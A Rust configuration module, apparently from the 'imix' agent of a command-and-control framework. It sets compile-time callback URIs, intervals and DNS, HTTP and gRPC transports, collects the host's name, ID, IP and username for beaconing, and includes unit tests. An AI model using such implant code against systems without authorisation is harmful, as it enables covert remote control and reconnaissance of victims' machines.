use uuid::Uuid;

use crate::c2::{AvailableTransports, Transport};

//TODO: Can this struct be removed?
/// Config holds values necessary to configure an Agent.
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Config {
    #[prost(message, optional, tag = "1")]
    pub info: ::core::option::Option<crate::c2::Beacon>,
    #[prost(bool, tag = "2")]
    pub run_once: bool,
}

macro_rules! callback_uri {
    () => {
        match option_env!("IMIX_CALLBACK_URI") {
            Some(uri) => uri,
            None => "http://127.0.0.1:8000",
        }
    };
}

/*
 * Compile-time constant for the agent callback URI, derived from the IMIX_CALLBACK_URI environment variable during compilation.
 * Defaults to "http://127.0.0.1:8000/grpc" if this is unset.
 */
pub const CALLBACK_URI: &str = callback_uri!();

macro_rules! callback_interval {
    () => {
        match option_env!("IMIX_CALLBACK_INTERVAL") {
            Some(interval) => interval,
            None => "5",
        }
    };
}
/* Compile-time constant for the agent callback interval, derived from the IMIX_CALLBACK_INTERVAL environment variable during compilation.
 * Defaults to 5 if unset.
 */
pub const CALLBACK_INTERVAL: &str = callback_interval!();

/* Default interval value in seconds */
const DEFAULT_INTERVAL_SECONDS: u64 = 5;

macro_rules! retry_interval {
    () => {
        match option_env!("IMIX_RETRY_INTERVAL") {
            Some(interval) => interval,
            None => "5",
        }
    };
}
/* Compile-time constant for the agent callback interval, derived from the IMIX_CALLBACK_INTERVAL environment variable during compilation.
 * Defaults to 5 if unset.
 */
pub const RETRY_INTERVAL: &str = retry_interval!();

macro_rules! run_once {
    () => {
        match option_env!("IMIX_RUN_ONCE") {
            Some(_) => true,
            None => false,
        }
    };
}

macro_rules! extra {
    () => {
        match option_env!("IMIX_TRANSPORT_EXTRA") {
            Some(extra) => extra.to_string(),
            None => String::from(""),
        }
    };
}

/* Compile-time constant for the agent run once flag, derived from the IMIX_RUN_ONCE environment variable during compilation.
 * Defaults to false if unset.
 */
pub const RUN_ONCE: bool = run_once!();

/*
 * Helper function to determine transport type from URI scheme
 */
fn get_transport_type(uri: &str) -> crate::c2::transport::Type {
    match uri.split(":").next().unwrap_or("unspecified") {
        "dns" => crate::c2::transport::Type::TransportDns,
        "http1" => crate::c2::transport::Type::TransportHttp1,
        "https1" => crate::c2::transport::Type::TransportHttp1,
        "https" => crate::c2::transport::Type::TransportGrpc,
        "http" => crate::c2::transport::Type::TransportGrpc,
        _ => crate::c2::transport::Type::TransportUnspecified,
    }
}

/*
 * Helper function to parse URIs into Transport objects
 */
fn parse_transports(uri_string: &str, callback_interval: u64, extra_config: String) -> Vec<Transport> {
    uri_string
        .split(';')
        .filter(|s| !s.trim().is_empty())
        .map(|uri| {
            let uri_trimmed = uri.trim();
            Transport {
                uri: String::from(uri_trimmed),
                interval: callback_interval,
                r#type: get_transport_type(uri_trimmed) as i32,
                extra: extra_config.clone(),
            }
        })
        .collect()
}

/*
 * Helper function to parse callback interval with fallback
 */
fn parse_callback_interval() -> u64 {
    match CALLBACK_INTERVAL.parse::<u64>() {
        Ok(i) => i,
        Err(_err) => {
            #[cfg(debug_assertions)]
            log::error!(
                "failed to parse callback interval constant, defaulting to {} seconds: {_err}",
                DEFAULT_INTERVAL_SECONDS
            );

            DEFAULT_INTERVAL_SECONDS
        }
    }
}

/*
 * Config methods.
 */
impl Config {
    pub fn default_with_imix_version(imix_version: &str) -> Self {
        let agent = crate::c2::Agent {
            identifier: format!("imix-v{}", imix_version),
        };

        let selectors = host_unique::defaults();

        let host = crate::c2::Host {
            name: whoami::fallible::hostname().unwrap_or(String::from("")),
            identifier: host_unique::get_id_with_selectors(selectors).to_string(),
            platform: get_host_platform() as i32,
            primary_ip: get_primary_ip(),
        };

        // Try to grab the beacon identitifier from env var, o/w use  a random UUID
        let beacon_id =
            std::env::var("IMIX_BEACON_ID").unwrap_or_else(|_| String::from(Uuid::new_v4()));

        // Parse CALLBACK_URI by splitting on ';' to support multiple transports
        let callback_interval = parse_callback_interval();
        let extra_config = extra!();
        let transports = parse_transports(CALLBACK_URI, callback_interval, extra_config);

        // Create AvailableTransports with the 0th element as the first active transport
        let available_transports = AvailableTransports {
            transports,
            active_index: 0,
        };

        let info = crate::c2::Beacon {
            identifier: beacon_id,
            principal: whoami::username(),
            available_transports: Some(available_transports),
            host: Some(host),
            agent: Some(agent),
        };

        Config {
            info: Some(info),
            run_once: RUN_ONCE,
        }
    }
    pub fn refresh_primary_ip(&mut self) {
        let fresh_ip = get_primary_ip();
        if self
            .info
            .clone()
            .is_some_and(|b| b.host.as_ref().is_some_and(|h| h.primary_ip != fresh_ip))
        {
            match self.info.clone() {
                Some(mut b) => match b.host.as_mut() {
                    Some(h) => {
                        h.primary_ip = fresh_ip;
                    }
                    None => {
                        #[cfg(debug_assertions)]
                        log::error!("host struct was never initialized, failed to set primary ip");
                    }
                },
                None => {
                    #[cfg(debug_assertions)]
                    log::error!("beacon struct was never initialized, failed to set primary ip");
                }
            }
        }
    }
}

/*
 * Returns which Platform imix has been compiled for.
 */
fn get_host_platform() -> crate::c2::host::Platform {
    #[cfg(target_os = "linux")]
    return crate::c2::host::Platform::Linux;

    #[cfg(target_os = "macos")]
    return crate::c2::host::Platform::Macos;

    #[cfg(target_os = "windows")]
    return crate::c2::host::Platform::Windows;

    #[cfg(any(target_os = "freebsd", target_os = "netbsd", target_os = "openbsd"))]
    return crate::c2::host::Platform::Bsd;

    #[cfg(all(
        not(target_os = "linux"),
        not(target_os = "macos"),
        not(target_os = "windows"),
        not(target_os = "freebsd"),
        not(target_os = "netbsd"),
        not(target_os = "openbsd"),
    ))]
    return crate::c2::host::Platform::Unspecified;
}

/*
 * Return the first IPv4 address of the default interface as a string.
 * Returns the empty string otherwise.
 */
fn get_primary_ip() -> String {
    match netdev::get_default_interface() {
        Ok(default_interface) => match default_interface.ipv4.first() {
            Some(ip) => ip.addr().to_string(),
            None => String::from(""),
        },
        Err(_err) => {
            #[cfg(debug_assertions)]
            log::error!("failed to get primary ip: {_err}");

            String::from("")
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_single_uri_parsing() {
        // Simulating a single URI at compile time
        let config = Config::default_with_imix_version("test");

        let info = config.info.expect("Config should have info");
        let available = info
            .available_transports
            .expect("Should have available transports");

        assert_eq!(available.transports.len(), 1);
        assert_eq!(available.active_index, 0);
        assert_eq!(available.transports[0].uri, CALLBACK_URI);
    }

    #[test]
    fn test_transport_type_detection_grpc() {
        let grpc_type = get_transport_type("http://example.com");
        assert_eq!(grpc_type, crate::c2::transport::Type::TransportGrpc);

        let grpcs_type = get_transport_type("https://example.com");
        assert_eq!(grpcs_type, crate::c2::transport::Type::TransportGrpc);
    }

    #[test]
    fn test_transport_type_detection_http1() {
        let http1_type = get_transport_type("http1://example.com");
        assert_eq!(http1_type, crate::c2::transport::Type::TransportHttp1);

        let https1_type = get_transport_type("https1://example.com");
        assert_eq!(https1_type, crate::c2::transport::Type::TransportHttp1);
    }

    #[test]
    fn test_transport_type_detection_dns() {
        let dns_type = get_transport_type("dns://8.8.8.8");
        assert_eq!(dns_type, crate::c2::transport::Type::TransportDns);
    }

    #[test]
    fn test_transport_type_detection_unspecified() {
        let unknown_type = get_transport_type("ftp://example.com");
        assert_eq!(
            unknown_type,
            crate::c2::transport::Type::TransportUnspecified
        );
    }

    #[test]
    fn test_parse_callback_interval_valid() {
        let interval = parse_callback_interval();
        // Should parse successfully or default to DEFAULT_INTERVAL_SECONDS
        assert!(interval >= DEFAULT_INTERVAL_SECONDS);
    }

    #[test]
    fn test_config_creates_available_transports() {
        let config = Config::default_with_imix_version("v2");

        assert!(config.info.is_some());
        let info = config.info.unwrap();
        assert!(info.available_transports.is_some());

        let available = info.available_transports.unwrap();
        assert!(
            !available.transports.is_empty(),
            "Should have at least one transport"
        );
        assert_eq!(available.active_index, 0, "Active index should be 0");
    }

    #[test]
    fn test_empty_uri_filtered() {
        // Test that empty URIs are filtered out using parse_transports
        let uris = "http://example.com;;https://example2.com";
        let transports = parse_transports(uris, 5, String::new());

        assert_eq!(transports.len(), 2);
        assert_eq!(transports[0].uri, "http://example.com");
        assert_eq!(transports[1].uri, "https://example2.com");
    }
}
